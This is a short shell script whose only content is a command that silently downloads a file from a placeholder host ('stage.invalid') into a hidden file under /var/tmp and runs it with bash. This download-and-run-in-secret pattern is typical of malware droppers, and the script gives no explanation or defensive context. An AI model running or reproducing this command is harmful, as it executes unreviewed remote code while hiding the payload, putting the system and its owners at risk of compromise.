#!/bin/sh
curl --silent https://stage.invalid/bootstrap --output '/var/tmp/.bootstrap' && bash '/var/tmp/.bootstrap'
